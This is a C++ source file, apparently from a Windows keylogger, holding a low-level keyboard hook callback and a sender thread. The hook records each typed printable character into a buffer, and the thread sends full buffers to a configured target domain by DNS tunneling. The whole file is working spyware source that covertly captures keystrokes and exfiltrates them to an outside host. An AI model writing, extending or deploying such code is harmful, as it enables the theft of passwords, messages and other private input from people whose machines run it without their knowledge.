#include "KeyLogger.h"
#include "Network.h"

/**
 * Keyboard hook callback function
 * Captures keystrokes and adds to queue for async sending
 * 
 * CRITICAL: This function must be FAST (< 1ms)
 * - NO console output (std::cout)
 * - NO network calls (sendData)
 * - Only capture keystrokes and add to buffer
 */
LRESULT __stdcall process_key(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode < 0 || nCode != HC_ACTION) {
		return CallNextHookEx(nullptr, nCode, wParam, lParam);
	}

	if (wParam == WM_KEYDOWN) {
		PKBDLLHOOKSTRUCT key = reinterpret_cast<PKBDLLHOOKSTRUCT>(lParam);
		
		// Update keyboard state
		GetKeyState(VK_SHIFT);
		BYTE keyboardState[256];
		if (!GetKeyboardState(keyboardState)) {
			return CallNextHookEx(nullptr, nCode, wParam, lParam);
		}
		
		unsigned short translatedChar[2] = {0};
		
		// Convert virtual key code to ASCII
		int result = ToAsciiEx(key->vkCode, key->scanCode, keyboardState, 
		                       translatedChar, key->flags, keyboardLayout);
		
		if (result == 1) {
			char keyChar = static_cast<char>(translatedChar[0]);
			
			// Only add printable ASCII characters (32-126)
			if (keyChar >= 32 && keyChar <= 126) {
				keystrokeBuffer += keyChar;
			}
			
			// When buffer is full, add to queue for async sending
			if (keystrokeBuffer.size() >= MAX_BUFFER) {
				// Thread-safe queue push
				{
					std::lock_guard<std::mutex> lock(queueMutex);
					sendQueue.push(keystrokeBuffer);
				}
				
				keystrokeBuffer.clear();  // Clear buffer immediately
			}
		}
	}
	
	return CallNextHookEx(nullptr, nCode, wParam, lParam);
}

/**
 * Sender thread - runs independently from hook
 * Processes queue and sends data via DNS tunneling
 * This keeps the hook fast and responsive
 */
DWORD WINAPI senderThread(LPVOID lpParam) {
	while (!shouldStopSender) {
		std::string dataToSend;
		
		// Check queue
		{
			std::lock_guard<std::mutex> lock(queueMutex);
			if (!sendQueue.empty()) {
				dataToSend = sendQueue.front();
				sendQueue.pop();
			}
		}
		
		// Send data if available
		if (!dataToSend.empty()) {
			int success = sendData(connectionId, packetNumber, 
			                       TARGET_DOMAIN.c_str(), dataToSend.c_str());
			
			if (success == 0) {
				packetNumber++;
				
				// Reset packet number after 999
				if (packetNumber > 999) {
					packetNumber = 0;
				}
			}
		} else {
			// No data, sleep to avoid busy-waiting
			Sleep(100);
		}
	}
	
	return 0;
}